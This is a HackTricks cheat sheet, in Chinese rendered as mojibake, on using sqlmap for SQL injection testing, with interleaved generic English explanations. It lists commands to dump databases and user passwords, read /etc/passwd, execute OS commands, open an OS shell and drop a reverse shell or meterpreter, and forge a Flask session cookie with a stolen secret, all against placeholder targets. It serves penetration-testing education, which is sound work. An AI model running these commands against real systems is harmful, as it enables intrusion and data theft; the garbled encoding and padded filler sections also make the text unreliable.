# SQLMap - é€ŸæŸ¥è¡¨

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘å¹³å° â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference æ˜¯ä¸€åœºå›½é™…ç½‘ç»œå®‰å…¨æ´»åŠ¨**](https://www.dragonjarcon.org/)ï¼Œå·²ç»ä¸¾åŠäº†åå¤šå¹´ï¼Œå°†äº2023å¹´9æœˆ7æ—¥è‡³8æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªæŠ€æœ¯å†…å®¹ä¸°å¯Œçš„æ´»åŠ¨ï¼Œå±•ç¤ºäº†æœ€æ–°çš„è¥¿ç­ç‰™è¯­ç ”ç©¶ï¼Œå¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„é»‘å®¢å’Œç ”ç©¶äººå‘˜ã€‚\
ç«‹å³åœ¨ä¸‹é¢çš„é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org/" %}

## SQLmap çš„åŸºæœ¬å‚æ•°

### é€šç”¨å‚æ•°
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### æ£€ç´¢ä¿¡æ¯

#### å†…éƒ¨
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### æ•°æ®åº“æ•°æ®

The database contains sensitive information that can be valuable to an attacker. This information can include usernames, passwords, personal details, financial data, and more. It is important for a penetration tester to identify and extract this data during a security assessment.

æ•°æ®åº“åŒ…å«å¯¹æ”»å‡»è€…æœ‰ä»·å€¼çš„æ•æ„Ÿä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åã€å¯†ç ã€ä¸ªäººè¯¦ç»†ä¿¡æ¯ã€è´¢åŠ¡æ•°æ®ç­‰ã€‚åœ¨å®‰å…¨è¯„ä¼°è¿‡ç¨‹ä¸­ï¼Œæ¸—é€æµ‹è¯•äººå‘˜éœ€è¦è¯†åˆ«å¹¶æå–è¿™äº›æ•°æ®ã€‚

SQL injection vulnerabilities can be exploited to access and manipulate the database directly. This allows an attacker to retrieve, modify, or delete data from the database. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

å¯ä»¥åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ç›´æ¥è®¿é—®å’Œæ“ä½œæ•°æ®åº“ã€‚è¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿä»æ•°æ®åº“ä¸­æ£€ç´¢ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®ã€‚SQLMapæ˜¯ä¸€æ¬¾å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„è¿‡ç¨‹ã€‚

By using SQLMap, a penetration tester can easily identify the presence of SQL injection vulnerabilities and extract data from the database. SQLMap supports various database management systems, including MySQL, Oracle, PostgreSQL, and Microsoft SQL Server.

é€šè¿‡ä½¿ç”¨SQLMapï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥è½»æ¾åœ°è¯†åˆ«SQLæ³¨å…¥æ¼æ´çš„å­˜åœ¨ï¼Œå¹¶ä»æ•°æ®åº“ä¸­æå–æ•°æ®ã€‚SQLMapæ”¯æŒå¤šç§æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ŒåŒ…æ‹¬MySQLã€Oracleã€PostgreSQLå’ŒMicrosoft SQL Serverã€‚

To use SQLMap, the tester needs to provide the target URL and specify the parameters vulnerable to SQL injection. SQLMap will then automatically detect and exploit the vulnerabilities, allowing the tester to extract data from the database.

è¦ä½¿ç”¨SQLMapï¼Œæµ‹è¯•äººå‘˜éœ€è¦æä¾›ç›®æ ‡URLå¹¶æŒ‡å®šæ˜“å—SQLæ³¨å…¥æ”»å‡»çš„å‚æ•°ã€‚ç„¶åï¼ŒSQLMapå°†è‡ªåŠ¨æ£€æµ‹å’Œåˆ©ç”¨æ¼æ´ï¼Œä½¿æµ‹è¯•äººå‘˜èƒ½å¤Ÿä»æ•°æ®åº“ä¸­æå–æ•°æ®ã€‚

It is important to note that SQLMap should only be used on systems that the tester has permission to test. Unauthorized use of SQLMap or any other hacking tool is illegal and unethical.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒSQLMapåªèƒ½åœ¨æµ‹è¯•äººå‘˜è·å¾—æµ‹è¯•æƒé™çš„ç³»ç»Ÿä¸Šä½¿ç”¨ã€‚æœªç»æˆæƒä½¿ç”¨SQLMapæˆ–ä»»ä½•å…¶ä»–é»‘å®¢å·¥å…·æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## æ³¨å…¥ä½ç½®

### ä»Burp/ZAPæ•è·

æ•è·è¯·æ±‚å¹¶åˆ›å»ºä¸€ä¸ªreq.txtæ–‡ä»¶
```bash
sqlmap -r req.txt --current-user
```
### GETè¯·æ±‚æ³¨å…¥

In some cases, web applications use GET requests to retrieve data from a database. This can make them vulnerable to SQL injection attacks. SQLMap is a powerful tool that can automate the process of detecting and exploiting SQL injection vulnerabilities in GET requests.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºä½¿ç”¨GETè¯·æ±‚ä»æ•°æ®åº“ä¸­æ£€ç´¢æ•°æ®ã€‚è¿™å¯èƒ½ä½¿å®ƒä»¬å®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»çš„å½±å“ã€‚SQLMapæ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥è‡ªåŠ¨åŒ–æ£€æµ‹å’Œåˆ©ç”¨GETè¯·æ±‚ä¸­çš„SQLæ³¨å…¥æ¼æ´ã€‚

To perform a GET request injection using SQLMap, you need to provide the target URL and specify the vulnerable parameter. SQLMap will then analyze the target and attempt to exploit any SQL injection vulnerabilities it finds.

è¦ä½¿ç”¨SQLMapæ‰§è¡ŒGETè¯·æ±‚æ³¨å…¥ï¼Œæ‚¨éœ€è¦æä¾›ç›®æ ‡URLå¹¶æŒ‡å®šæ˜“å—æ”»å‡»çš„å‚æ•°ã€‚ç„¶åï¼ŒSQLMapå°†åˆ†æç›®æ ‡å¹¶å°è¯•åˆ©ç”¨å®ƒå‘ç°çš„ä»»ä½•SQLæ³¨å…¥æ¼æ´ã€‚

Here is an example command to perform a GET request injection using SQLMap:

ä»¥ä¸‹æ˜¯ä½¿ç”¨SQLMapæ‰§è¡ŒGETè¯·æ±‚æ³¨å…¥çš„ç¤ºä¾‹å‘½ä»¤ï¼š

```
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql --level=5 --risk=3 --tamper=space2comment
```

In this command, `-u` specifies the target URL, `--dbms` specifies the database management system, `--level` specifies the level of tests to perform, `--risk` specifies the risk level, and `--tamper` specifies the tampering script to use.

åœ¨æ­¤å‘½ä»¤ä¸­ï¼Œ`-u`æŒ‡å®šç›®æ ‡URLï¼Œ`--dbms`æŒ‡å®šæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œ`--level`æŒ‡å®šè¦æ‰§è¡Œçš„æµ‹è¯•çº§åˆ«ï¼Œ`--risk`æŒ‡å®šé£é™©çº§åˆ«ï¼Œ`--tamper`æŒ‡å®šè¦ä½¿ç”¨çš„ç¯¡æ”¹è„šæœ¬ã€‚

SQLMap will automatically analyze the target URL, detect any SQL injection vulnerabilities, and attempt to exploit them. It will provide detailed information about the vulnerabilities it finds, such as the type of vulnerability, the payload used, and the results of the exploitation.

SQLMapå°†è‡ªåŠ¨åˆ†æç›®æ ‡URLï¼Œæ£€æµ‹ä»»ä½•SQLæ³¨å…¥æ¼æ´ï¼Œå¹¶å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚å®ƒå°†æä¾›æœ‰å…³å‘ç°çš„æ¼æ´çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚æ¼æ´ç±»å‹ã€ä½¿ç”¨çš„æœ‰æ•ˆè½½è·å’Œåˆ©ç”¨ç»“æœã€‚

It is important to note that performing SQL injection attacks without proper authorization is illegal and unethical. Always ensure that you have proper authorization and permission before conducting any penetration testing activities.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚åœ¨è¿›è¡Œä»»ä½•æ¸—é€æµ‹è¯•æ´»åŠ¨ä¹‹å‰ï¼Œå§‹ç»ˆç¡®ä¿æ‚¨å…·æœ‰é€‚å½“çš„æˆæƒå’Œè®¸å¯ã€‚
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POSTè¯·æ±‚æ³¨å…¥

In some cases, the target application may use the POST method to send data to the server. This can be a common scenario for login forms or data submission forms. In such cases, the attacker can exploit SQL injection vulnerabilities by injecting malicious SQL statements into the POST parameters.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç›®æ ‡åº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨POSTæ–¹æ³•å°†æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ã€‚è¿™åœ¨ç™»å½•è¡¨å•æˆ–æ•°æ®æäº¤è¡¨å•ä¸­æ˜¯å¸¸è§çš„æƒ…å†µã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘POSTå‚æ•°ä¸­æ³¨å…¥æ¶æ„çš„SQLè¯­å¥æ¥åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ã€‚

To perform a POST request injection, you can use the `--data` option in SQLMap to specify the POST data. The `--data` option takes a string parameter in the format `param1=value1&param2=value2`, where `param1` and `param2` are the names of the POST parameters and `value1` and `value2` are the corresponding values.

è¦æ‰§è¡ŒPOSTè¯·æ±‚æ³¨å…¥ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨SQLMapä¸­çš„`--data`é€‰é¡¹æ¥æŒ‡å®šPOSTæ•°æ®ã€‚`--data`é€‰é¡¹æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œæ ¼å¼ä¸º`param1=value1&param2=value2`ï¼Œå…¶ä¸­`param1`å’Œ`param2`æ˜¯POSTå‚æ•°çš„åç§°ï¼Œ`value1`å’Œ`value2`æ˜¯ç›¸åº”çš„å€¼ã€‚

For example, if the target application has a login form with two parameters `username` and `password`, you can use the following command to perform a POST request injection:

ä¾‹å¦‚ï¼Œå¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºå…·æœ‰ä¸€ä¸ªå¸¦æœ‰ä¸¤ä¸ªå‚æ•°`username`å’Œ`password`çš„ç™»å½•è¡¨å•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡ŒPOSTè¯·æ±‚æ³¨å…¥ï¼š

```
sqlmap -u "http://example.com/login" --method POST --data "username=admin&password=test"
```

In this example, SQLMap will send a POST request to `http://example.com/login` with the `username` parameter set to `admin` and the `password` parameter set to `test`. SQLMap will then analyze the response to identify any SQL injection vulnerabilities.

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼ŒSQLMapå°†ä½¿ç”¨`username`å‚æ•°è®¾ç½®ä¸º`admin`å’Œ`password`å‚æ•°è®¾ç½®ä¸º`test`å‘`http://example.com/login`å‘é€POSTè¯·æ±‚ã€‚ç„¶åï¼ŒSQLMapå°†åˆ†æå“åº”ä»¥è¯†åˆ«ä»»ä½•SQLæ³¨å…¥æ¼æ´ã€‚

Remember to properly encode the values of the POST parameters to ensure that the request is correctly interpreted by the server. You can use URL encoding or other appropriate encoding methods for this purpose.

è¯·è®°ä½æ­£ç¡®ç¼–ç POSTå‚æ•°çš„å€¼ï¼Œä»¥ç¡®ä¿æœåŠ¡å™¨æ­£ç¡®è§£é‡Šè¯·æ±‚ã€‚æ‚¨å¯ä»¥ä½¿ç”¨URLç¼–ç æˆ–å…¶ä»–é€‚å½“çš„ç¼–ç æ–¹æ³•æ¥å®ç°è¿™ä¸€ç›®çš„ã€‚
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### å¤´éƒ¨å’Œå…¶ä»–HTTPæ–¹æ³•ä¸­çš„æ³¨å…¥

In addition to injecting payloads in the URL parameters, SQL injection can also occur in other parts of the HTTP request, such as headers and other HTTP methods. These injection points can be exploited to manipulate the behavior of the web application and potentially extract sensitive information from the database.

#### Header Injection

Header injection occurs when user-controlled input is not properly sanitized and is included in the HTTP headers. Attackers can inject malicious content into headers, which can lead to various security vulnerabilities, including cross-site scripting (XSS) and remote code execution (RCE).

To test for header injection vulnerabilities, you can use SQLMap's `--headers` option. This option allows you to specify custom headers to be sent with the HTTP request. By injecting payloads into the headers, you can check if the application is vulnerable to header injection attacks.

#### Other HTTP Methods

SQL injection can also occur in other HTTP methods, such as POST, PUT, and DELETE. These methods are commonly used for data manipulation and can be vulnerable to injection attacks if user input is not properly sanitized.

To test for SQL injection vulnerabilities in other HTTP methods, you can use SQLMap's `--method` option. This option allows you to specify the HTTP method to be used during the attack. By injecting payloads into the request body or parameters of these methods, you can check if the application is vulnerable to SQL injection.

It is important to thoroughly test all possible injection points in the HTTP request to ensure the security of the web application.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### å½“æ³¨å…¥æˆåŠŸæ—¶æŒ‡ç¤ºå­—ç¬¦ä¸²

When performing SQL injection attacks, it is important to determine whether the injection was successful or not. One way to do this is by indicating a specific string that will be displayed if the injection is successful.

To achieve this, you can use the `--string` option in SQLMap. This option allows you to specify a string that should be present in the response when the injection is successful.

Here is an example command that demonstrates the usage of the `--string` option:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --string "Injection successful"
```

In this example, SQLMap will send requests to the specified URL with different payloads to test for SQL injection vulnerabilities. If the response contains the string "Injection successful", SQLMap will consider the injection to be successful.

By indicating a specific string, you can easily identify whether the injection was successful or not, allowing you to proceed with further exploitation or move on to other targets.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap**å…è®¸ä½¿ç”¨`-e`æˆ–`--eval`åœ¨å‘é€æ¯ä¸ªæœ‰æ•ˆè½½è·ä¹‹å‰ä½¿ç”¨ä¸€äº›Pythonä¸€è¡Œä»£ç è¿›è¡Œå¤„ç†ã€‚è¿™ä½¿å¾—åœ¨å‘é€æœ‰æ•ˆè½½è·ä¹‹å‰ä»¥è‡ªå®šä¹‰æ–¹å¼éå¸¸å®¹æ˜“å’Œå¿«é€Ÿåœ°å¤„ç†æœ‰æ•ˆè½½è·ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œ**flask cookie session**åœ¨å‘é€ä¹‹å‰ç”±flaskä½¿ç”¨å·²çŸ¥çš„å¯†é’¥è¿›è¡Œç­¾åï¼š
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

#### Introduction

The shell is a command-line interface that allows users to interact with the operating system. It provides a way to execute commands, navigate the file system, and manage processes. In the context of penetration testing, the shell is a powerful tool that can be used to gain unauthorized access to a target system.

#### Types of Shells

There are different types of shells available, each with its own features and capabilities. Some common types of shells include:

- **Bourne Shell (sh):** The Bourne shell is the original Unix shell and is still widely used today. It provides basic functionality and is compatible with most Unix-like systems.

- **Bash (Bourne Again SHell):** Bash is a popular shell that is compatible with the Bourne shell. It includes additional features such as command history, tab completion, and job control.

- **C Shell (csh):** The C shell is another Unix shell that provides a C-like syntax and additional features such as command-line editing and history.

- **Korn Shell (ksh):** The Korn shell is an enhanced version of the Bourne shell with additional features such as command-line editing, history, and job control.

- **Zsh (Z Shell):** Zsh is a powerful shell that includes features from other shells such as Bash and Korn shell. It provides advanced customization options and is highly extensible.

#### Using the Shell for Penetration Testing

In penetration testing, the shell is often used to execute commands on a target system and perform various tasks such as reconnaissance, privilege escalation, and data exfiltration. Here are some common use cases for using the shell in penetration testing:

- **Command Execution:** The shell can be used to execute commands on a target system, allowing the tester to gather information, manipulate files, and perform other actions.

- **File System Navigation:** The shell provides commands for navigating the file system, allowing the tester to explore directories, list files, and access sensitive data.

- **Process Management:** The shell allows the tester to manage processes on the target system, including starting, stopping, and monitoring processes.

- **Privilege Escalation:** The shell can be used to escalate privileges on a target system, gaining higher levels of access and control.

- **Data Exfiltration:** The shell can be used to exfiltrate data from a target system, allowing the tester to retrieve sensitive information.

#### Conclusion

The shell is a powerful tool in penetration testing, providing the ability to execute commands, navigate the file system, and manage processes. Understanding the different types of shells and their capabilities is essential for effective penetration testing. By leveraging the power of the shell, testers can identify vulnerabilities, exploit them, and assess the security of target systems.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### è¯»å–æ–‡ä»¶

The `--file-read` option in SQLMap allows you to read files from the database server's file system. This can be useful for retrieving sensitive information stored in files.

To use this option, you need to provide the path to the file you want to read. SQLMap will then attempt to read the contents of the file and display them in the output.

Here is an example command:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"
```

In this example, SQLMap will send a request to the vulnerable URL `http://example.com/vulnerable.php?id=1` and attempt to read the contents of the `/etc/passwd` file.

Keep in mind that this technique may not work in all cases, as it depends on the permissions and configuration of the database server. Additionally, it is important to use this technique responsibly and only on systems that you have proper authorization to test.
```bash
--file-read=/etc/passwd
```
### ä½¿ç”¨SQLmapçˆ¬å–ç½‘ç«™å¹¶è‡ªåŠ¨åˆ©ç”¨æ¼æ´

SQLmapæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è‡ªåŠ¨åŒ–SQLæ³¨å…¥å·¥å…·ï¼Œå¯ä»¥ç”¨äºçˆ¬å–ç½‘ç«™å¹¶è‡ªåŠ¨åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨SQLmapè¿›è¡Œç½‘ç«™çˆ¬å–å’Œè‡ªåŠ¨åˆ©ç”¨çš„æ­¥éª¤ï¼š

1. **çˆ¬å–ç½‘ç«™**
   - ä½¿ç”¨`-u`å‚æ•°æŒ‡å®šç›®æ ‡ç½‘ç«™çš„URLï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com`
   - SQLmapå°†è‡ªåŠ¨æ‰«æç›®æ ‡ç½‘ç«™ï¼Œå¯»æ‰¾å¯èƒ½å­˜åœ¨çš„SQLæ³¨å…¥æ¼æ´
   - ä¸€æ—¦å‘ç°æ¼æ´ï¼ŒSQLmapå°†æä¾›è¿›ä¸€æ­¥çš„æ“ä½œé€‰é¡¹

2. **è‡ªåŠ¨åˆ©ç”¨æ¼æ´**
   - ä½¿ç”¨`--dbs`å‚æ•°è·å–ç›®æ ‡ç½‘ç«™ä¸Šçš„æ•°æ®åº“ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com --dbs`
   - ä½¿ç”¨`-D`å‚æ•°æŒ‡å®šè¦æ”»å‡»çš„æ•°æ®åº“ï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com -D dbname`
   - ä½¿ç”¨`--tables`å‚æ•°è·å–ç›®æ ‡æ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com -D dbname --tables`
   - ä½¿ç”¨`-T`å‚æ•°æŒ‡å®šè¦æ”»å‡»çš„è¡¨ï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com -D dbname -T tablename`
   - ä½¿ç”¨`--dump`å‚æ•°è·å–ç›®æ ‡è¡¨ä¸­çš„æ•°æ®ï¼Œä¾‹å¦‚ï¼š`sqlmap -u http://www.example.com -D dbname -T tablename --dump`

é€šè¿‡æŒ‰ç…§ä¸Šè¿°æ­¥éª¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨SQLmapè‡ªåŠ¨çˆ¬å–ç½‘ç«™å¹¶åˆ©ç”¨SQLæ³¨å…¥æ¼æ´è·å–ç›®æ ‡æ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®ã€‚è¯·æ³¨æ„ï¼Œåœ¨è¿›è¡Œä»»ä½•å½¢å¼çš„æ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œç¡®ä¿æ‚¨å·²ç»è·å¾—äº†åˆæ³•çš„æˆæƒï¼Œå¹¶éµå®ˆé€‚ç”¨çš„æ³•å¾‹æ³•è§„ã€‚
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### äºŒæ¬¡æ³¨å…¥

Second Order Injection is a type of SQL injection attack that occurs when user input is not directly used in a SQL query, but is stored in a database and later used in a query. This can happen when user input is stored in a database and then retrieved and used in a query without proper sanitization or validation.

äºŒæ¬¡æ³¨å…¥æ˜¯ä¸€ç§SQLæ³¨å…¥æ”»å‡»ç±»å‹ï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸ç›´æ¥ç”¨äºSQLæŸ¥è¯¢ï¼Œè€Œæ˜¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­å¹¶åœ¨ç¨åçš„æŸ¥è¯¢ä¸­ä½¿ç”¨æ—¶å‘ç”Ÿã€‚è¿™å¯èƒ½å‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥è¢«å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç„¶ååœ¨æŸ¥è¯¢ä¸­æ£€ç´¢å’Œä½¿ç”¨æ—¶æ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤æˆ–éªŒè¯ã€‚

For example, let's say a web application allows users to submit comments, which are then stored in a database. Later, when displaying these comments, the application retrieves them from the database and includes them in a SQL query without proper sanitization. An attacker can then manipulate their comment to include malicious SQL code, which will be executed when the query is run.

ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªWebåº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·æäº¤è¯„è®ºï¼Œè¿™äº›è¯„è®ºéšåå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚ç¨åï¼Œåœ¨æ˜¾ç¤ºè¿™äº›è¯„è®ºæ—¶ï¼Œåº”ç”¨ç¨‹åºä»æ•°æ®åº“ä¸­æ£€ç´¢å®ƒä»¬å¹¶å°†å®ƒä»¬åŒ…å«åœ¨ä¸€ä¸ªSQLæŸ¥è¯¢ä¸­ï¼Œè€Œæ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤ã€‚æ”»å‡»è€…å¯ä»¥æ“çºµä»–ä»¬çš„è¯„è®ºï¼ŒåŒ…å«æ¶æ„çš„SQLä»£ç ï¼Œå½“æŸ¥è¯¢è¿è¡Œæ—¶å°†è¢«æ‰§è¡Œã€‚

To exploit a second order injection vulnerability, an attacker typically needs to have their input stored in the database and then trigger the execution of the query that uses the stored input. This can be done by either manipulating the application to perform the query or by waiting for a legitimate user to trigger the query.

è¦åˆ©ç”¨äºŒæ¬¡æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…é€šå¸¸éœ€è¦å°†ä»–ä»¬çš„è¾“å…¥å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç„¶åè§¦å‘ä½¿ç”¨å­˜å‚¨è¾“å…¥çš„æŸ¥è¯¢çš„æ‰§è¡Œã€‚è¿™å¯ä»¥é€šè¿‡æ“çºµåº”ç”¨ç¨‹åºæ‰§è¡ŒæŸ¥è¯¢æˆ–ç­‰å¾…åˆæ³•ç”¨æˆ·è§¦å‘æŸ¥è¯¢æ¥å®Œæˆã€‚

To prevent second order injection attacks, it is important to properly sanitize and validate all user input before using it in a query. This includes both input that is used directly in a query and input that is stored in a database for later use. Additionally, using prepared statements or parameterized queries can help protect against second order injection by separating the query logic from the user input.

ä¸ºäº†é˜²æ­¢äºŒæ¬¡æ³¨å…¥æ”»å‡»ï¼Œåœ¨ä½¿ç”¨ç”¨æˆ·è¾“å…¥ä¹‹å‰ï¼Œæ­£ç¡®åœ°å¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯éå¸¸é‡è¦ã€‚è¿™åŒ…æ‹¬ç›´æ¥åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨çš„è¾“å…¥å’Œå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ä»¥ä¾›ä»¥åä½¿ç”¨çš„è¾“å…¥ã€‚æ­¤å¤–ï¼Œä½¿ç”¨é¢„å¤„ç†è¯­å¥æˆ–å‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é€šè¿‡å°†æŸ¥è¯¢é€»è¾‘ä¸ç”¨æˆ·è¾“å…¥åˆ†ç¦»æ¥å¸®åŠ©é˜²æ­¢äºŒæ¬¡æ³¨å…¥æ”»å‡»ã€‚
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**é˜…è¯»æ­¤æ–‡ç« **](second-order-injection-sqlmap.md)**ï¼Œäº†è§£å¦‚ä½•ä½¿ç”¨sqlmapæ‰§è¡Œç®€å•å’Œå¤æ‚çš„äºŒæ¬¡æ³¨å…¥ã€‚**

## å®è·µå®éªŒå®¤

* é€šè¿‡åœ¨**THMæˆ¿é—´**ä¸­ä½¿ç”¨sqlmapæ¥å­¦ä¹ å®ƒï¼š

{% embed url="https://tryhackme.com/room/sqlmap" %}

## è‡ªå®šä¹‰æ³¨å…¥

